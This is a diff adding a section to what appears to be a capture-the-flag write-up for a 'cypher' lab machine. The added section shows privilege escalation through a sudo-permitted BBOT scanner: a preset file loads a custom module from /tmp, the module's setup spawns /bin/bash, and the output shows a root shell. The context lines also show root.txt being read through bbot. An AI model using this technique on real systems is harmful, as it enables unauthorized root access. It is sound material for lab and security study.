@@ -195,3 +195,49 @@ graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
 [DBUG] internal.excavate: Final combined yara rule contents: deadbeef391d500f1073fab93010fake
 ...
 ```
+
+If you want to spawn a shell, you can load a [custom module](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/). <br>
+
+The preset file :
+
+```yml
+# load extra BBOT modules from this locaation
+module_dirs:
+  - /tmp/.test
+modules:
+  - jergal
+```
+
+The module file :
+
+```py
+from bbot.modules.base import BaseModule
+
+class jergal(BaseModule):
+    # one-time setup - runs at the beginning of the scan
+    async def setup(self):
+        import os; os.system("/bin/bash")
+```
+
+Run the preset :
+
+```bash
+graphasm@cypher:/tmp/.test$ sudo bbot -p ./custom_modules.yml --dry-run
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ <|  __ <| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+[INFO] Scan with 1 modules seeded with 0 targets (0 in whitelist)
+[INFO] Loaded 1/1 scan modules (jergal)
+[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
+[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
+root@cypher:/tmp/.test# whoami
+root
+root@cypher:/tmp/.test#
+```
